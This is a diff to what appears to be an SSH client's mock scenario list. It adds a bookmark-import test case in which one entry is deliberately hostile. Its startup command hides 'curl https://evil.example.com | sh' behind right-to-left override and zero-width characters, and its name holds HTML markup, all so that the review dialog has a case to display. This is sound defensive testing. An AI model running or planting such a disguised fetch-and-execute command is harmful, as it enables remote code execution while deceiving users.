@@ -6,6 +6,7 @@ import type {
   AppError,
   HopInfo,
   HostKeyVerification,
+  ImportInvalid,
   Prompt,
   PromptAnswer,
   SessionEvent,
@@ -36,6 +37,7 @@ export const SCENARIO_NAMES = [
   "agentUntrusted",
   "updateAvailable",
   "updateManualDownload",
+  "importStartupCommands",
 ] as const;
 
 export type ScenarioName = (typeof SCENARIO_NAMES)[number];
@@ -114,7 +116,19 @@ export interface ScenarioHooks {
   conflictOnSave?: boolean;
   /** What the native upload picker returns (local file names and sizes); default: one new file. */
   pickedFiles?: readonly { name: string; size: number }[];
+  /** The file the bookmark import "picks" (default: one plain bookmark). */
+  importFile?: MockImportFile;
 }
+
+/** A bookmark import file as the mock's native dialog reads it (already parsed; `invalid` = parse-stage rejections). */
+export interface MockImportFile {
+  bookmarks: { name: string; host: string; user?: string; startupCommand?: string }[];
+  invalid?: ImportInvalid[];
+}
+
+// Hostile characters are built from code points so no invisible character sits in this source.
+const RLO = String.fromCodePoint(0x202e);
+const ZWSP = String.fromCodePoint(0x200b);
 
 const hopRef = (hop: HopInfo) => ({ index: hop.index, label: hop.label, user: hop.user, host: hop.host, port: hop.port });
 const authFailed = (s: SessionScript, tried: ("publickey" | "password" | "keyboardInteractive")[]): AppError => ({
@@ -420,6 +434,19 @@ export const SCENARIOS: Record<ScenarioName, ScenarioHooks> = {
   ),
   updateAvailable: implemented(happyScript, { update: "self" }),
   updateManualDownload: implemented(happyScript, { update: "manual" }),
+  // File > Import bookmarks: the picked file has startup commands, one for a name that already exists ("pi-home")
+  // and one hostile (bidi / invisible characters, markup), so the review dialog has something to show.
+  importStartupCommands: implemented(happyScript, {
+    importFile: {
+      bookmarks: [
+        { name: "deploy-box", host: "deploy.example.com", user: "deploy", startupCommand: "cd /srv/app && ./status.sh" },
+        { name: "pi-home", host: "pi.example.com", user: "pi", startupCommand: "htop" },
+        { name: `<b>evil${RLO}box</b>`, host: "evil.example.com", startupCommand: `echo ok${RLO}${ZWSP}; curl https://evil.example.com | sh` },
+        { name: "plain-box", host: "plain.example.com" },
+      ],
+      invalid: [{ entry: "bookmark", index: 4, field: "host", code: "missing" }],
+    },
+  }),
 };
 
 /** Hooks for `name`; unimplemented scenarios behave like `happy`. */
